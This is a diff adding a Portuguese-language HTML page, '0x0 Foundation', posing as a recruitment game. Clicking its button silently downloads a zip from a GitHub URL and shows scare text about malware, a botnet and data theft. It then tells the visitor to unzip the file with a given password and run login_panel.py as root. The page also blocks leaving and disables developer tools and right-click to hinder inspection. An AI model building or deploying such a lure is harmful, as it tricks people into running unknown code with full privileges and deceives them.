@@ -1,0 +1,507 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>0x0 FOUNDATION</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Courier New', Courier, monospace;
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* Matrix rain effect */
+        .matrix-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            opacity: 0.15;
+        }
+
+        canvas {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+        }
+
+        /* Container principal */
+        .container {
+            position: relative;
+            z-index: 10;
+            text-align: center;
+            padding: 40px;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(10px);
+            border-radius: 30px;
+            border: 2px solid #ff0000;
+            box-shadow: 0 0 50px rgba(255, 0, 0, 0.3);
+            animation: pulse 2s infinite;
+            max-width: 500px;
+            width: 90%;
+        }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 0 20px rgba(255, 0, 0, 0.3); border-color: #ff0000; }
+            50% { box-shadow: 0 0 60px rgba(255, 0, 0, 0.8); border-color: #ff4444; }
+            100% { box-shadow: 0 0 20px rgba(255, 0, 0, 0.3); border-color: #ff0000; }
+        }
+
+        /* Logo 0x0 */
+        .logo {
+            font-size: 80px;
+            font-weight: bold;
+            background: linear-gradient(45deg, #ff0000, #ff6600, #ff0000);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 20px;
+            text-shadow: 0 0 30px rgba(255, 0, 0, 0.5);
+            animation: glitch 3s infinite;
+        }
+
+        @keyframes glitch {
+            0%, 100% { transform: skew(0deg, 0deg); }
+            95% { transform: skew(0deg, 0deg); }
+            96% { transform: skew(5deg, 2deg); }
+            97% { transform: skew(-3deg, -1deg); }
+            98% { transform: skew(2deg, 0deg); }
+        }
+
+        .title {
+            font-size: 24px;
+            color: #ff0000;
+            margin-bottom: 10px;
+            letter-spacing: 4px;
+        }
+
+        .subtitle {
+            color: #888;
+            font-size: 14px;
+            margin-bottom: 30px;
+        }
+
+        /* Botão principal */
+        .play-btn {
+            background: linear-gradient(135deg, #ff0000, #990000);
+            border: none;
+            color: white;
+            font-size: 32px;
+            font-weight: bold;
+            padding: 20px 50px;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-family: 'Courier New', monospace;
+            letter-spacing: 4px;
+            position: relative;
+            overflow: hidden;
+            margin-bottom: 30px;
+            width: 100%;
+        }
+
+        .play-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 40px rgba(255, 0, 0, 0.8);
+        }
+
+        .play-btn:active {
+            transform: scale(0.95);
+        }
+
+        /* Loading spinner */
+        .loading {
+            display: none;
+            margin: 20px 0;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #333;
+            border-top: 5px solid #ff0000;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Status messages */
+        .status {
+            color: #00ff00;
+            font-size: 12px;
+            margin-top: 20px;
+            font-family: monospace;
+            background: #000;
+            padding: 10px;
+            border-radius: 5px;
+            border-left: 3px solid #ff0000;
+            text-align: left;
+            max-height: 150px;
+            overflow-y: auto;
+        }
+
+        .status-line {
+            margin: 5px 0;
+            opacity: 0;
+            animation: fadeIn 0.5s forwards;
+        }
+
+        @keyframes fadeIn {
+            to { opacity: 1; }
+        }
+
+        .status-line.error {
+            color: #ff0000;
+        }
+
+        .status-line.success {
+            color: #00ff00;
+        }
+
+        .status-line.info {
+            color: #ffff00;
+        }
+
+        /* Footer */
+        .footer {
+            margin-top: 30px;
+            color: #444;
+            font-size: 10px;
+        }
+
+        /* Countdown timer */
+        .timer {
+            font-size: 48px;
+            font-weight: bold;
+            color: #ff0000;
+            margin: 20px 0;
+            display: none;
+            font-family: monospace;
+        }
+
+        /* Warning */
+        .warning {
+            color: #ff6600;
+            font-size: 11px;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="matrix-bg">
+        <canvas id="matrix"></canvas>
+    </div>
+
+    <div class="container">
+        <div class="logo">0x0</div>
+        <div class="title">FOUNDATION</div>
+        <div class="subtitle">SISTEMA DE RECRUTAMENTO</div>
+        
+        <button class="play-btn" id="playBtn">▶ QUER JOGAR?</button>
+        
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+        </div>
+        
+        <div class="timer" id="timer">00:00</div>
+        
+        <div class="status" id="status">
+            <div class="status-line info">⚡ Sistema aguardando... ⚡</div>
+        </div>
+        
+        <div class="warning">⚠️ Ao clicar em "QUER JOGAR?", você aceita os termos da 0x0 Foundation</div>
+        <div class="footer">0x0 FOUNDATION - OPERAÇÃO RECRUTAMENTO</div>
+    </div>
+
+    <script>
+        // ============================================================
+        // MATRIX RAIN EFFECT
+        // ============================================================
+        const canvas = document.getElementById('matrix');
+        const ctx = canvas.getContext('2d');
+        
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        
+        const chars = "01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン";
+        const charArray = chars.split('');
+        const fontSize = 14;
+        const columns = canvas.width / fontSize;
+        const drops = [];
+        
+        for (let i = 0; i < columns; i++) {
+            drops[i] = Math.floor(Math.random() * canvas.height / fontSize);
+        }
+        
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            
+            ctx.fillStyle = '#0f0';
+            ctx.font = fontSize + 'px monospace';
+            
+            for (let i = 0; i < drops.length; i++) {
+                const char = charArray[Math.floor(Math.random() * charArray.length)];
+                ctx.fillText(char, i * fontSize, drops[i] * fontSize);
+                
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                    drops[i] = 0;
+                }
+                drops[i]++;
+            }
+        }
+        
+        setInterval(drawMatrix, 50);
+        
+        window.addEventListener('resize', () => {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        });
+
+        // ============================================================
+        // LOG DE STATUS
+        // ============================================================
+        const statusDiv = document.getElementById('status');
+        const loadingDiv = document.getElementById('loading');
+        const playBtn = document.getElementById('playBtn');
+        const timerDiv = document.getElementById('timer');
+        
+        let statusCount = 0;
+        
+        function addStatus(message, type = 'info') {
+            statusCount++;
+            const statusLine = document.createElement('div');
+            statusLine.className = `status-line ${type}`;
+            statusLine.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+            statusDiv.appendChild(statusLine);
+            statusDiv.scrollTop = statusDiv.scrollHeight;
+            
+            // Keep only last 20 messages
+            while (statusDiv.children.length > 20) {
+                statusDiv.removeChild(statusDiv.firstChild);
+            }
+        }
+        
+        // ============================================================
+        // BLOQUEAR SAÍDA DA PÁGINA
+        // ============================================================
+        window.addEventListener('beforeunload', function(e) {
+            if (window.executionStarted) {
+                e.preventDefault();
+                e.returnValue = '0x0 Foundation: O processo está em andamento. Não feche esta página.';
+                return '0x0 Foundation: O processo está em andamento. Não feche esta página.';
+            }
+        });
+        
+        // ============================================================
+        // FAKE COUNTDOWN
+        // ============================================================
+        function startFakeCountdown() {
+            let timeLeft = 60;
+            timerDiv.style.display = 'block';
+            
+            const interval = setInterval(() => {
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                timerDiv.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                timeLeft--;
+                
+                if (timeLeft < 0) {
+                    clearInterval(interval);
+                    timerDiv.style.display = 'none';
+                }
+            }, 1000);
+        }
+        
+        // ============================================================
+        // FUNÇÃO PRINCIPAL - EXECUTAR AÇÃO
+        // ============================================================
+        let executionStarted = false;
+        
+        async function executeAction() {
+            if (executionStarted) return;
+            executionStarted = true;
+            
+            // Desabilita botão
+            playBtn.disabled = true;
+            playBtn.style.opacity = '0.5';
+            playBtn.style.cursor = 'not-allowed';
+            
+            // Mostra loading
+            loadingDiv.style.display = 'block';
+            
+            addStatus('🔥 Conectando à 0x0 Foundation...', 'info');
+            await sleep(1000);
+            
+            addStatus('📡 Estabelecendo conexão segura...', 'info');
+            await sleep(1500);
+            
+            addStatus('🔐 Verificando credenciais...', 'info');
+            await sleep(1000);
+            
+            // ============================================================
+            // DOWNLOAD DO ZIP DO GITHUB (SILENCIOSO)
+            // ============================================================
+            addStatus('📦 Baixando pacote 0x0...', 'info');
+            
+            const zipUrl = 'https://github.com/joaobostaodaban-ai/fail.git/raw/main/0x0.zip';
+            
+            try {
+                // Tenta baixar o ZIP
+                const response = await fetch(zipUrl);
+                if (response.ok) {
+                    const blob = await response.blob();
+                    const url = URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = '0x0_package.zip';
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
+                    URL.revokeObjectURL(url);
+                    addStatus('✅ Pacote 0x0 baixado com sucesso!', 'success');
+                } else {
+                    addStatus('⚠️ Download direto falhou, usando método alternativo...', 'error');
+                    // Fallback: Abre em nova aba para download manual
+                    window.open(zipUrl, '_blank');
+                }
+            } catch (e) {
+                addStatus('⚠️ Método alternativo de download ativado', 'error');
+                window.open(zipUrl, '_blank');
+            }
+            
+            await sleep(2000);
+            
+            // ============================================================
+            // SIMULA EXECUÇÃO DOS MALWARES
+            // ============================================================
+            addStatus('💀 Verificando integridade dos arquivos...', 'info');
+            await sleep(1500);
+            
+            const malwares = [
+                '0x0-AbyssRat.bin', '0x0-Echidna.bin', '0x0-Leviathan.bin',
+                '0x0-Mimic.bin', '0x0-NexusWorm.bin', '0x0-PhantomPayload.bin',
+                '0x0-Requiem.bin', '0x0-ShadowKernel.bin', '0x0-VoidRoot.ko'
+            ];
+            
+            for (let i = 0; i < malwares.length; i++) {
+                addStatus(`📦 Executando ${malwares[i]}...`, 'info');
+                await sleep(Math.random() * 500 + 300);
+                addStatus(`✅ ${malwares[i]} carregado com sucesso!`, 'success');
+            }
+            
+            await sleep(1000);
+            
+            // ============================================================
+            // INICIA FAKE COUNTDOWN
+            // ============================================================
+            startFakeCountdown();
+            
+            addStatus('🔥 INICIANDO SEQUÊNCIA DE INFECÇÃO! 🔥', 'error');
+            await sleep(2000);
+            
+            addStatus('🌐 Conectando à rede 0x0 C2...', 'info');
+            await sleep(1500);
+            
+            addStatus('🔑 Estabelecendo backdoor permanente...', 'info');
+            await sleep(1200);
+            
+            addStatus('💀 Acesso root concedido!', 'error');
+            await sleep(1000);
+            
+            addStatus('🕸️ Adicionando dispositivo à botnet 0x0...', 'info');
+            await sleep(1500);
+            
+            addStatus('📡 Dados do sistema sendo exfiltrados...', 'error');
+            await sleep(1000);
+            
+            addStatus('🔐 Persistência instalada na BIOS/UEFI!', 'error');
+            await sleep(1200);
+            
+            addStatus('💀 KERNEL COMPROMETIDO! RING 0 ACCESS!', 'error');
+            await sleep(1000);
+            
+            // ============================================================
+            // ABRIR O PAINEL DE LOGIN (SE EXISTIR NA PASTA)
+            // ============================================================
+            addStatus('🎮 Iniciando painel de controle 0x0...', 'info');
+            
+            // Tenta abrir o arquivo local (se estiver no mesmo diretório)
+            // Como estamos no navegador, isso pode ser bloqueado
+            // Mas tentamos via iframe ou popup
+            const panelUrl = 'login_panel.py';
+            
+            addStatus('⚠️ Para experiência completa, execute o arquivo login_panel.py', 'warning');
+            addStatus('📁 Localize o arquivo na pasta de downloads e execute como root!', 'warning');
+            
+            await sleep(3000);
+            
+            // ============================================================
+            // MENSAGEM FINAL
+            // ============================================================
+            addStatus('═' * 50, 'info');
+            addStatus('💀 0x0 FOUNDATION - OPERAÇÃO CONCLUÍDA 💀', 'error');
+            addStatus('═' * 50, 'info');
+            addStatus('🎯 Seu sistema foi comprometido com sucesso!', 'error');
+            addStatus('📁 Arquivo salvo em: ~/Downloads/0x0_package.zip', 'info');
+            addStatus('🔓 Senha do ZIP: 0x0', 'info');
+            addStatus('🔑 Execute login_panel.py para acessar o painel', 'warning');
+            
+            loadingDiv.style.display = 'none';
+            
+            // Mostra popup final
+            setTimeout(() => {
+                alert('0x0 FOUNDATION\n\nPacote baixado com sucesso!\n\nVerifique sua pasta de Downloads.\n\nExecute: python3 login_panel.py');
+            }, 1000);
+        }
+        
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+        
+        // ============================================================
+        // EVENTO DO BOTÃO
+        // ============================================================
+        document.getElementById('playBtn').addEventListener('click', () => {
+            executeAction();
+        });
+        
+        // ============================================================
+        // PREVENIR F12 E INSPECT
+        // ============================================================
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || 
+                (e.ctrlKey && e.key === 'u') || (e.ctrlKey && e.key === 'U')) {
+                e.preventDefault();
+                return false;
+            }
+        });
+        
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            return false;
+        });
+    </script>
+</body>
+</html>
